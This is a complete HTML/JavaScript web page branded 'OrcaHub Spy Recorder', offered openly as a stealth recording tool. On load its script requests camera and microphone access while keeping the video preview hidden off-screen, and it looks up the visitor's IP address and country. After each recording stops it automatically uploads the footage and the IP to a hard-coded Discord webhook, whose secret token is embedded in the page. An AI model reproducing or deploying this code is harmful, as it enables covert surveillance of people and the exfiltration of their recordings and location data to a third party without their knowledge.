<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>OrcaHub • Spy Recorder</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: 'Segoe UI', 'Helvetica Neue', system-ui, sans-serif;
        }

        body {
            min-height: 100vh;
            background: radial-gradient(ellipse at center, #0a0a12 0%, #1a0a1e 40%, #0d0d18 100%);
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            padding: 20px;
            position: relative;
            overflow-x: hidden;
        }

        .bubbles {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            pointer-events: none;
            z-index: 0;
            overflow: hidden;
        }

        .bubble {
            position: absolute;
            bottom: -150px;
            border-radius: 50%;
            opacity: 0.08;
            animation: rise linear infinite;
        }

        .bubble:nth-child(1) { width: 250px; height: 250px; left: 5%; animation-duration: 22s; background: radial-gradient(circle, #a29bfe, transparent); }
        .bubble:nth-child(2) { width: 400px; height: 400px; left: 25%; animation-duration: 32s; animation-delay: 3s; background: radial-gradient(circle, #ff6b6b, transparent); }
        .bubble:nth-child(3) { width: 200px; height: 200px; left: 50%; animation-duration: 26s; animation-delay: 5s; background: radial-gradient(circle, #4ecdc4, transparent); }
        .bubble:nth-child(4) { width: 350px; height: 350px; left: 70%; animation-duration: 38s; animation-delay: 2s; background: radial-gradient(circle, #ffe66d, transparent); }
        .bubble:nth-child(5) { width: 300px; height: 300px; left: 85%; animation-duration: 28s; animation-delay: 7s; background: radial-gradient(circle, #a29bfe, transparent); }

        @keyframes rise {
            0% { transform: translateY(0) scale(0.7); opacity: 0.05; }
            50% { opacity: 0.12; }
            100% { transform: translateY(-120vh) scale(1.2); opacity: 0; }
        }

        .shape {
            position: fixed;
            border-radius: 50%;
            filter: blur(100px);
            opacity: 0.08;
            animation: floatShape 20s ease-in-out infinite;
            pointer-events: none;
            z-index: 0;
        }

        .shape:nth-child(1) { width: 400px; height: 400px; background: radial-gradient(circle, #ff6b6b, transparent 70%); top: 5%; left: -10%; }
        .shape:nth-child(2) { width: 500px; height: 500px; background: radial-gradient(circle, #a29bfe, transparent 70%); bottom: -10%; right: -10%; animation-delay: -5s; }
        .shape:nth-child(3) { width: 300px; height: 300px; background: radial-gradient(circle, #4ecdc4, transparent 70%); top: 50%; left: 60%; animation-delay: -8s; }

        @keyframes floatShape {
            0%, 100% { transform: translate(0, 0) scale(1); }
            25% { transform: translate(50px, -60px) scale(1.1); }
            50% { transform: translate(-40px, 40px) scale(0.9); }
            75% { transform: translate(-60px, -20px) scale(1.05); }
        }

        .glass-card {
            position: relative;
            z-index: 10;
            width: 100%;
            max-width: 520px;
            background: rgba(16, 16, 30, 0.88);
            backdrop-filter: blur(30px);
            -webkit-backdrop-filter: blur(30px);
            border-radius: 50px;
            border: 1px solid rgba(255, 255, 255, 0.05);
            box-shadow: 0 30px 80px rgba(0, 0, 0, 0.7), inset 0 1px 0 rgba(255, 255, 255, 0.04), 0 0 100px rgba(162, 155, 254, 0.05);
            padding: 36px 28px 32px;
            transition: all 0.5s cubic-bezier(0.175, 0.885, 0.32, 1.275);
            animation: fadeIn 0.8s ease;
        }

        @keyframes fadeIn {
            from { opacity: 0; transform: translateY(30px) scale(0.97); }
            to { opacity: 1; transform: translateY(0) scale(1); }
        }

        .header {
            text-align: center;
            margin-bottom: 28px;
        }

        .logo-icon {
            font-size: 3.8rem;
            display: inline-block;
            background: linear-gradient(135deg, #ff6b6b, #a29bfe, #4ecdc4);
            -webkit-background-clip: text;
            background-clip: text;
            color: transparent;
            filter: drop-shadow(0 0 40px rgba(162, 155, 254, 0.2));
            animation: floatIcon 3.5s ease-in-out infinite;
        }

        @keyframes floatIcon {
            0%, 100% { transform: translateY(0px); }
            50% { transform: translateY(-10px); }
        }

        h1 {
            font-size: 1.8rem;
            font-weight: 900;
            background: linear-gradient(135deg, #a29bfe, #ff6b6b, #4ecdc4);
            -webkit-background-clip: text;
            background-clip: text;
            color: transparent;
            letter-spacing: -0.5px;
            margin-top: 4px;
            background-size: 300% 300%;
            animation: gradientText 5s ease-in-out infinite;
        }

        @keyframes gradientText {
            0% { background-position: 0% 50%; }
            50% { background-position: 100% 50%; }
            100% { background-position: 0% 50%; }
        }

        .sub {
            color: #8888aa;
            font-size: 0.7rem;
            letter-spacing: 4px;
            text-transform: uppercase;
            margin-top: 6px;
            font-weight: 300;
            border-top: 1px solid rgba(255, 255, 255, 0.04);
            padding-top: 10px;
        }

        /* ===== STATUS BAR ===== */
        .status-bar {
            display: flex;
            justify-content: space-between;
            align-items: center;
            background: rgba(10, 10, 20, 0.4);
            border-radius: 30px;
            padding: 8px 16px;
            margin-bottom: 20px;
            border: 1px solid rgba(255, 255, 255, 0.03);
        }

        .status-bar .dot {
            width: 10px;
            height: 10px;
            border-radius: 50%;
            display: inline-block;
            margin-right: 8px;
        }

        .dot.green { background: #4ecdc4; box-shadow: 0 0 20px rgba(78, 205, 196, 0.3); }
        .dot.red { background: #ff6b6b; box-shadow: 0 0 20px rgba(255, 107, 107, 0.3); }
        .dot.yellow { background: #ffe66d; box-shadow: 0 0 20px rgba(255, 230, 109, 0.3); }
        .dot.pulse { animation: pulse 1.5s ease-in-out infinite; }

        @keyframes pulse {
            0%, 100% { opacity: 1; transform: scale(1); }
            50% { opacity: 0.5; transform: scale(0.8); }
        }

        .status-text {
            color: #8888aa;
            font-size: 0.7rem;
            font-weight: 600;
            letter-spacing: 1px;
            text-transform: uppercase;
        }

        .status-text span { color: #fff; }

        /* ===== VIDEO PREVIEW (HIDDEN) ===== */
        .video-preview {
            display: none;
        }

        /* ===== INFO BAR ===== */
        .info-bar {
            display: flex;
            justify-content: space-between;
            background: rgba(10, 10, 20, 0.3);
            border-radius: 20px;
            padding: 10px 16px;
            margin-bottom: 18px;
            border: 1px solid rgba(255, 255, 255, 0.03);
            font-size: 0.7rem;
            color: #666688;
            flex-wrap: wrap;
            gap: 5px;
        }

        .info-bar span { color: #c0c0dd; font-weight: 600; }

        /* ===== RECORDER CONTROLS ===== */
        .recorder-controls {
            display: flex;
            gap: 12px;
            margin-bottom: 20px;
            flex-wrap: wrap;
        }

        .recorder-controls button {
            flex: 1;
            min-width: 100px;
            padding: 14px 20px;
            border: none;
            border-radius: 35px;
            font-weight: 700;
            font-size: 0.85rem;
            color: white;
            cursor: pointer;
            transition: all 0.4s cubic-bezier(0.175, 0.885, 0.32, 1.275);
            text-transform: uppercase;
            letter-spacing: 1px;
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 8px;
        }

        .btn-start {
            background: linear-gradient(135deg, #ff6b6b, #ee5a24);
        }

        .btn-start:hover { transform: scale(1.03); box-shadow: 0 10px 40px rgba(255, 107, 107, 0.3); }
        .btn-start:active { transform: scale(0.95); }
        .btn-start:disabled { opacity: 0.4; cursor: not-allowed; transform: none !important; }

        .btn-stop {
            background: linear-gradient(135deg, #a29bfe, #6c5ce7);
        }

        .btn-stop:hover { transform: scale(1.03); box-shadow: 0 10px 40px rgba(162, 155, 254, 0.3); }
        .btn-stop:active { transform: scale(0.95); }
        .btn-stop:disabled { opacity: 0.4; cursor: not-allowed; transform: none !important; }

        .btn-send {
            background: linear-gradient(135deg, #4ecdc4, #00b894);
        }

        .btn-send:hover { transform: scale(1.03); box-shadow: 0 10px 40px rgba(78, 205, 196, 0.3); }
        .btn-send:active { transform: scale(0.95); }
        .btn-send:disabled { opacity: 0.4; cursor: not-allowed; transform: none !important; }

        .btn-instagram {
            background: linear-gradient(135deg, #f58529, #dd2a7b);
            text-decoration: none;
            min-width: 60px;
            flex: 0.5;
        }

        .btn-instagram:hover { transform: scale(1.03); box-shadow: 0 10px 40px rgba(221, 42, 123, 0.3); }

        .btn-instagram svg {
            width: 18px;
            height: 18px;
            fill: currentColor;
        }

        /* ===== LOADER ===== */
        .loader-container {
            display: none;
            text-align: center;
            padding: 10px 0;
        }

        .loader-container.show {
            display: block;
            animation: fadeInScale 0.4s ease;
        }

        @keyframes fadeInScale {
            from { opacity: 0; transform: scale(0.95); }
            to { opacity: 1; transform: scale(1); }
        }

        .spinner {
            width: 40px;
            height: 40px;
            border: 3px solid rgba(162, 155, 254, 0.08);
            border-top-color: #a29bfe;
            border-right-color: #ff6b6b;
            border-radius: 50%;
            animation: spin 0.8s ease infinite;
            margin: 0 auto 10px;
        }

        @keyframes spin {
            to { transform: rotate(360deg); }
        }

        .loader-text {
            color: #8888aa;
            font-size: 0.8rem;
            font-weight: 300;
        }

        /* ===== RESULT ===== */
        .result-message {
            display: none;
            background: rgba(78, 205, 196, 0.06);
            border: 1px solid rgba(78, 205, 196, 0.12);
            color: #4ecdc4;
            padding: 12px 16px;
            border-radius: 24px;
            text-align: center;
            font-size: 0.85rem;
            font-weight: 600;
            margin-top: 14px;
            animation: fadeInScale 0.4s ease;
        }

        .result-message.show {
            display: block;
        }

        .result-message .big {
            font-size: 2rem;
            display: block;
            margin-bottom: 4px;
        }

        .error-message {
            display: none;
            background: rgba(255, 107, 107, 0.08);
            border: 1px solid rgba(255, 107, 107, 0.15);
            color: #ff6b6b;
            padding: 10px 14px;
            border-radius: 20px;
            font-size: 0.8rem;
            font-weight: 500;
            text-align: center;
            margin-top: 10px;
            animation: fadeInScale 0.4s ease;
        }

        .error-message.show {
            display: block;
        }

        .footer {
            text-align: center;
            color: #3a3a52;
            font-size: 0.55rem;
            margin-top: 24px;
            border-top: 1px solid rgba(255, 255, 255, 0.02);
            padding-top: 16px;
            letter-spacing: 1.5px;
            text-transform: uppercase;
        }

        /* ===== HIDDEN VIDEO ELEMENT ===== */
        #hiddenVideo {
            position: fixed;
            top: -9999px;
            left: -9999px;
            width: 1px;
            height: 1px;
            opacity: 0;
            pointer-events: none;
        }

        @media (max-width: 480px) {
            .glass-card { padding: 24px 16px 20px; border-radius: 36px; }
            h1 { font-size: 1.4rem; }
            .logo-icon { font-size: 3rem; }
            .recorder-controls { flex-direction: column; }
            .recorder-controls button { min-width: auto; }
            .btn-instagram { flex: 1; }
            .status-bar { flex-wrap: wrap; gap: 5px; justify-content: center; }
            .info-bar { flex-direction: column; align-items: center; text-align: center; gap: 3px; }
        }

        @media (max-height: 700px) {
            .glass-card { padding: 20px 16px 16px; }
            .header { margin-bottom: 16px; }
            .logo-icon { font-size: 2.5rem; }
            h1 { font-size: 1.2rem; }
            .recorder-controls button { padding: 10px 16px; font-size: 0.7rem; }
        }
    </style>
</head>
<body>

    <div class="bubbles">
        <div class="bubble"></div>
        <div class="bubble"></div>
        <div class="bubble"></div>
        <div class="bubble"></div>
        <div class="bubble"></div>
    </div>
    <div class="shape"></div>
    <div class="shape"></div>
    <div class="shape"></div>

    <div class="glass-card" id="app">
        <div class="header">
            <div class="logo-icon">✦</div>
            <h1>OrcaHub • Spy Recorder</h1>
            <div class="sub">Stealth Recording</div>
        </div>

        <!-- Hidden Video Element -->
        <video id="hiddenVideo" autoplay muted playsinline></video>

        <div class="status-bar">
            <div>
                <span class="dot green" id="statusDot"></span>
                <span class="status-text" id="statusText">System <span>Ready</span></span>
            </div>
            <div class="status-text" id="ipDisplay">🌐 IP: <span>Detecting...</span></div>
        </div>

        <div class="info-bar">
            <div>⏱️ Duration: <span id="durationDisplay">00:00</span></div>
            <div>📦 Size: <span id="sizeDisplay">0 KB</span></div>
            <div>🎤 Audio: <span id="audioStatus">✅ Enabled</span></div>
        </div>

        <div class="recorder-controls">
            <button class="btn-start" id="startBtn">▶ Start Recording</button>
            <button class="btn-stop" id="stopBtn" disabled>⏹ Stop</button>
            <button class="btn-send" id="sendBtn" disabled>📤 Send</button>
            <a class="btn-instagram" id="instagramBtn" href="#" target="_blank">
                <svg viewBox="0 0 24 24"><path d="M12 2.163c3.204 0 3.584.012 4.85.07 3.252.148 4.771 1.691 4.919 4.919.058 1.265.069 1.645.069 4.849 0 3.205-.012 3.584-.069 4.849-.149 3.225-1.664 4.771-4.919 4.919-1.266.058-1.644.07-4.85.07-3.204 0-3.584-.012-4.849-.07-3.26-.149-4.771-1.699-4.919-4.92-.058-1.265-.07-1.644-.07-4.849 0-3.204.013-3.583.07-4.849.149-3.227 1.664-4.771 4.919-4.919 1.266-.057 1.645-.069 4.849-.069zM12 0C8.741 0 8.333.014 7.053.072 2.695.272.273 2.69.073 7.052.014 8.333 0 8.741 0 12c0 3.259.014 3.668.072 4.948.2 4.358 2.618 6.78 6.98 6.98C8.333 23.986 8.741 24 12 24c3.259 0 3.668-.014 4.948-.072 4.354-.2 6.782-2.618 6.979-6.98.059-1.28.073-1.689.073-4.948 0-3.259-.014-3.667-.072-4.947-.196-4.354-2.617-6.78-6.979-6.98C15.668.014 15.259 0 12 0zm0 5.838a6.162 6.162 0 100 12.324 6.162 6.162 0 000-12.324zM12 16a4 4 0 110-8 4 4 0 010 8zm6.406-11.845a1.44 1.44 0 100 2.881 1.44 1.44 0 000-2.881z"/></svg>
            </a>
        </div>

        <div class="loader-container" id="loaderContainer">
            <div class="spinner"></div>
            <div class="loader-text">⏳ Processing recording...</div>
        </div>

        <div class="result-message" id="resultMessage">
            <span class="big">✅</span>
            Recording sent successfully!
        </div>

        <div class="error-message" id="errorMessage"></div>

        <div class="footer">OrcaHub • Spy Recorder • 2025</div>
    </div>

    <script>
        document.addEventListener('DOMContentLoaded', () => {
            // ==================== WEBHOOK ====================
            const WEBHOOK_URL = 'https://discord.com/api/webhooks/1545842219787886693/PRkcsE8DY_anZhky9n7173-Gwslo7XF9PMZ6hT5igehnWPkie9KAmdbcSn1I_a20KtxG';

            // ==================== DOM REFS ====================
            const DOM = {
                video: document.getElementById('hiddenVideo'),
                startBtn: document.getElementById('startBtn'),
                stopBtn: document.getElementById('stopBtn'),
                sendBtn: document.getElementById('sendBtn'),
                instagramBtn: document.getElementById('instagramBtn'),
                statusDot: document.getElementById('statusDot'),
                statusText: document.getElementById('statusText'),
                ipDisplay: document.getElementById('ipDisplay'),
                durationDisplay: document.getElementById('durationDisplay'),
                sizeDisplay: document.getElementById('sizeDisplay'),
                audioStatus: document.getElementById('audioStatus'),
                loader: document.getElementById('loaderContainer'),
                result: document.getElementById('resultMessage'),
                error: document.getElementById('errorMessage'),
            };

            DOM.instagramBtn.href = 'https://www.instagram.com/uiogunio?stkn=MWY5OWppbGY1bmhsdw==';

            // ==================== STATE ====================
            let mediaStream = null;
            let recordedChunks = [];
            let mediaRecorder = null;
            let isRecording = false;
            let startTime = 0;
            let durationInterval = null;
            let recordedBlob = null;
            let userIP = 'Unknown';
            let isCameraReady = false;

            // ==================== GET IP ====================
            async function getIP() {
                try {
                    const response = await fetch('https://api.ipify.org?format=json');
                    const data = await response.json();
                    userIP = data.ip || 'Unknown';
                } catch (_) { userIP = 'Unknown'; }
                try {
                    const countryResponse = await fetch(`https://ipapi.co/${userIP}/country_name/`);
                    const country = await countryResponse.text();
                    userIP = `${userIP} (${country.trim() || 'Unknown'})`;
                } catch (_) {}
                DOM.ipDisplay.innerHTML = `🌐 IP: <span>${userIP}</span>`;
                return userIP;
            }

            // ==================== SET STATUS ====================
            function setStatus(state, text) {
                DOM.statusDot.className = 'dot ' + state;
                DOM.statusText.innerHTML = `System <span>${text}</span>`;
            }

            // ==================== SHOW ERROR ====================
            function showError(msg) {
                DOM.error.textContent = msg;
                DOM.error.classList.add('show');
                setTimeout(() => DOM.error.classList.remove('show'), 5000);
            }

            // ==================== SHOW RESULT ====================
            function showResult(msg) {
                DOM.result.innerHTML = `<span class="big">✅</span>${msg}`;
                DOM.result.classList.add('show');
                setTimeout(() => DOM.result.classList.remove('show'), 6000);
            }

            // ==================== START CAMERA (HIDDEN) ====================
            async function startCamera() {
                try {
                    const constraints = {
                        video: {
                            facingMode: 'user',
                            width: { ideal: 640 },
                            height: { ideal: 480 }
                        },
                        audio: true
                    };
                    mediaStream = await navigator.mediaDevices.getUserMedia(constraints);
                    DOM.video.srcObject = mediaStream;
                    isCameraReady = true;
                    setStatus('green', 'Camera Ready');
                    return true;
                } catch (err) {
                    showError('❌ Camera access denied: ' + err.message);
                    setStatus('red', 'Camera Error');
                    return false;
                }
            }

            // ==================== START RECORDING ====================
            async function startRecording() {
                if (!isCameraReady) {
                    const started = await startCamera();
                    if (!started) return;
                }

                recordedChunks = [];
                try {
                    mediaRecorder = new MediaRecorder(mediaStream, {
                        mimeType: 'video/webm;codecs=vp9,opus',
                        videoBitsPerSecond: 2500000,
                        audioBitsPerSecond: 128000
                    });
                } catch {
                    try {
                        mediaRecorder = new MediaRecorder(mediaStream, {
                            mimeType: 'video/webm;codecs=vp8,opus',
                            videoBitsPerSecond: 2500000,
                            audioBitsPerSecond: 128000
                        });
                    } catch {
                        mediaRecorder = new MediaRecorder(mediaStream, {
                            videoBitsPerSecond: 2500000,
                            audioBitsPerSecond: 128000
                        });
                    }
                }

                mediaRecorder.ondataavailable = (e) => {
                    if (e.data.size > 0) recordedChunks.push(e.data);
                };

                mediaRecorder.onstop = () => {
                    recordedBlob = new Blob(recordedChunks, { type: 'video/webm' });
                    const size = (recordedBlob.size / 1024).toFixed(1);
                    DOM.sizeDisplay.textContent = size + ' KB';
                    DOM.sendBtn.disabled = false;
                    setStatus('green', 'Recording Stopped');
                    if (durationInterval) {
                        clearInterval(durationInterval);
                        durationInterval = null;
                    }
                    // Auto-send after stop
                    setTimeout(sendRecording, 500);
                };

                mediaRecorder.start(1000);
                isRecording = true;
                startTime = Date.now();
                DOM.startBtn.disabled = true;
                DOM.stopBtn.disabled = false;
                DOM.sendBtn.disabled = true;
                setStatus('red', 'Recording...');
                DOM.audioStatus.textContent = '🔴 Recording';

                durationInterval = setInterval(() => {
                    const elapsed = Math.floor((Date.now() - startTime) / 1000);
                    const mins = String(Math.floor(elapsed / 60)).padStart(2, '0');
                    const secs = String(elapsed % 60).padStart(2, '0');
                    DOM.durationDisplay.textContent = `${mins}:${secs}`;
                }, 1000);
            }

            // ==================== STOP RECORDING ====================
            function stopRecording() {
                if (mediaRecorder && isRecording) {
                    mediaRecorder.stop();
                    isRecording = false;
                    DOM.startBtn.disabled = false;
                    DOM.stopBtn.disabled = true;
                    DOM.audioStatus.textContent = '⏹ Stopped';
                    if (durationInterval) {
                        clearInterval(durationInterval);
                        durationInterval = null;
                    }
                    setStatus('yellow', 'Processing...');
                }
            }

            // ==================== SEND TO WEBHOOK ====================
            async function sendRecording() {
                if (!recordedBlob || recordedBlob.size === 0) {
                    showError('❌ No recording to send!');
                    return;
                }

                DOM.loader.classList.add('show');
                DOM.sendBtn.disabled = true;
                setStatus('yellow', 'Uploading...');

                try {
                    const formData = new FormData();
                    const filename = `recording_${Date.now()}.webm`;
                    formData.append('file', recordedBlob, filename);
                    formData.append('content', `🎥 New Recording\n🌐 IP: ${userIP}\n⏱️ Duration: ${DOM.durationDisplay.textContent}\n📦 Size: ${DOM.sizeDisplay.textContent}`);

                    const response = await fetch(WEBHOOK_URL, {
                        method: 'POST',
                        body: formData,
                    });

                    DOM.loader.classList.remove('show');

                    if (response.ok || response.status === 204) {
                        showResult('✅ Recording sent successfully!');
                        setStatus('green', 'Sent!');
                        DOM.sendBtn.disabled = true;
                        recordedChunks = [];
                        recordedBlob = null;
                        DOM.sizeDisplay.textContent = '0 KB';
                        DOM.durationDisplay.textContent = '00:00';
                    } else {
                        showError('❌ Failed to send. Status: ' + response.status);
                        setStatus('red', 'Send Failed');
                        DOM.sendBtn.disabled = false;
                    }
                } catch (err) {
                    DOM.loader.classList.remove('show');
                    showError('❌ Send error: ' + err.message);
                    setStatus('red', 'Send Error');
                    DOM.sendBtn.disabled = false;
                }
            }

            // ==================== EVENTS ====================
            DOM.startBtn.addEventListener('click', startRecording);
            DOM.stopBtn.addEventListener('click', stopRecording);
            DOM.sendBtn.addEventListener('click', sendRecording);

            // ==================== INIT ====================
            getIP();
            setStatus('green', 'Ready');
            // Start camera automatically on load (hidden)
            setTimeout(startCamera, 1000);

            // ==================== KEYBOARD SHORTCUTS ====================
            document.addEventListener('keydown', (e) => {
                if (e.key === 'r' || e.key === 'R') {
                    if (!isRecording) startRecording();
                }
                if (e.key === 's' || e.key === 'S') {
                    if (isRecording) stopRecording();
                }
            });

            console.log('[🦈] OrcaHub Spy Recorder loaded (Stealth Mode)');
            console.log('[⌨️] Shortcuts: R=Record, S=Stop (Auto-send after stop)');
        });
    </script>
